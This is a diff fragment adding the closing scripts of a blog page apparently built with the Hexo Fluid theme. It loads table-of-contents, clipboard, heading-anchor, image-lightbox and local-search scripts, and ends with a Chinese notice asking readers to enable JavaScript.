+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
